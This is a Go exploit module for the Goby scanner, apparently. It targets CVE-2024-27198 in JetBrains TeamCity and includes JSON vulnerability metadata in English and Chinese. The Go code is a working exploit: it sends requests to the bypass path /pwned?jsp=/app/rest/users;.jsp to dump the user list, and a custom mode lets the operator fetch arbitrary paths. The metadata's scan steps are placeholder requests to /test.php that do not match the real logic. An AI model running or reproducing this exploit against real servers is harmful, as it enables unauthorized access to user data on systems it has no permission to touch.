package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp Information Disclosure Vulnerability",
    "Description": "<p>JetBrains TeamCity is a powerful continuous integration tool that supports Java, . .NET and other project development, providing automated build, test, and deployment processes to help teams improve development efficiency, ensure code quality, and respond quickly to changes.</p><p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp An information disclosure vulnerability could allow an attacker to access sensitive information.</p>",
    "Product": "JetBrains TeamCity",
    "Homepage": "https://www.jetbrains.com/",
    "DisclosureDate": "2024-05-31",
    "PostTime": "2024-06-06",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"Log in to TeamCity\"",
    "GobyQuery": "body=\"Log in to TeamCity\"",
    "Level": "3",
    "Impact": "<p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp An information disclosure vulnerability could allow an attacker to access sensitive information.</p>",
    "Recommendation": "<p>The vendor has not released the solution yet, please pay attention to the vendor update: <a href=\"https://www.jetbrains.com/\">https://www.jetbrains.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "user",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2024-27198"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "JetBrains TeamCity /pwned 信息泄露漏洞（CVE-2024-27198）",
            "Product": "JetBrains TeamCity",
            "Description": "<p>JetBrains TeamCity是一款强大的持续集成工具，支持Java、.NET等项目开发，提供自动化的构建、测试和部署流程，帮助团队提高开发效率、保证代码质量并快速响应变化。<br></p><p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp 存在信息泄露漏洞，攻击者可通过该漏洞访问敏感信息。<br></p>",
            "Recommendation": "<p>厂商暂未发布解决方案，请关注厂商更新：<a href=\"https://www.jetbrains.com/\" target=\"_blank\">https://www.jetbrains.com/</a></p>",
            "Impact": "<p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp 存在信息泄露漏洞，攻击者可通过该漏洞访问敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp Information Disclosure Vulnerability",
            "Product": "JetBrains TeamCity",
            "Description": "<p>JetBrains TeamCity is a powerful continuous integration tool that supports Java, . .NET and other project development, providing automated build, test, and deployment processes to help teams improve development efficiency, ensure code quality, and respond quickly to changes.</p><p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp An information disclosure vulnerability could allow an attacker to access sensitive information.</p>",
            "Recommendation": "<p>The vendor has not released the solution yet, please pay attention to the vendor update: <a href=\"https://www.jetbrains.com/\" target=\"_blank\">https://www.jetbrains.com/</a><br></p>",
            "Impact": "<p>JetBrains TeamCity /pwned?jsp=/app/rest/users;.jsp An information disclosure vulnerability could allow an attacker to access sensitive information.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10959"
}`

	postOrGet_sdg54FHD := func(hostInfo *httpclient.FixUrl, fileUrl string, headerMap map[string]string) (string, error) {
		getRequest := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
			getRequestConfigsdg54FHD := httpclient.NewGetRequestConfig(urlOfGet)
			getRequestConfigsdg54FHD.VerifyTls = false
			getRequestConfigsdg54FHD.FollowRedirect = false
			if getHeaderMap != nil {
				for postHeaderKey, postHeaderValue := range getHeaderMap {
					getRequestConfigsdg54FHD.Header.Store(postHeaderKey, postHeaderValue)
				}
			}
			return httpclient.DoHttpRequest(hostInfo, getRequestConfigsdg54FHD)
		}

		resp, err := getRequest(hostInfo, fileUrl, headerMap)
		if err != nil {
			return "", err
		}

		// 注意：返回值为（最终要返回的读取结果，错误）
		return resp.Utf8Html, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/pwned?jsp=/app/rest/users;.jsp"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/pwned?jsp=/app/rest/users;.jsp": "xml",
			}
			headerMap := map[string]string{}
			// 函数继承
			uploadFileFunc := postOrGet_sdg54FHD

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl, headerMap)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"user": {"/pwned?jsp=/app/rest/users;.jsp", "xml"},
			}
			headerMap := map[string]string{}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_sdg54FHD
			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl, headerMap)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		}))
}
